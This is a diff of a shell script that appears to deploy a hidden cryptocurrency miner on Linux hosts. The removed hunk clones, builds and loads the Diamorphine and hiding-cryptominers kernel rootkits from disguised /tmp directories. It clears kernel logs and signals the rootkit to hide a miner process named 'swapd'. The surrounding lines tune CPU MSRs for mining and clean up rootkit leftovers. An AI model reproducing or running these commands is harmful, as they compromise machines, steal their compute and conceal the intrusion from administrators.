@@ -471,39 +471,6 @@ echo "Possible CPU Threads:"
 apt install dwarves -y
 cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/
 
-echo "[*] make toolZ, Diamorphine"
-cd /tmp
-cd .ICE-unix
-cd .X11-unix
-rm -rf Diamorphine
-rm -rf Reptile
-rm -rf hiding-cryptominers-linux-rootkit
-yum reinstall kmod* -y
-yum install git kernel-modules kernel-devel kernel-header linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules* kernel-headers git make gcc msr-tools -y --force-yes
-apt-get update -y
-apt reinstall kmod -y --force-yes
-apt-get install --reinstall kmod -y
-apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y --force-yes
-zypper update -y
-zypper reinstall kmod*
-zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y
-git clone https://github.com/m0nad/Diamorphine
-cd Diamorphine/
-make
-insmod diamorphine.ko
-dmesg -C
-kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
-
-echo "[*] hide crypto miner."
-cd /tmp
-cd .ICE-unix
-cd .X11-unix
-rm -rf hiding-cryptominers-linux-rootkit
-git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make
-dmesg -C && insmod rootkit.ko && dmesg
-kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
-rm -rf hiding-cryptominers-linux-rootkit/
-
 optimize_func() {
   MSR_FILE=/sys/module/msr/parameters/allow_writes
 
@@ -642,7 +609,8 @@ rm -rf Diamorphine
 rm -rf Reptile
 yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y
 apt-get update -y
-sudo dkms remove wireguard
+apt-get install dkms -y
+dkms remove wireguard
 apt-get reinstall kmod
 apt-get install linux-generic linux-headers-$(uname -r) -y
 apt-get install git make gcc msr-tools build-essential libncurses-dev -y
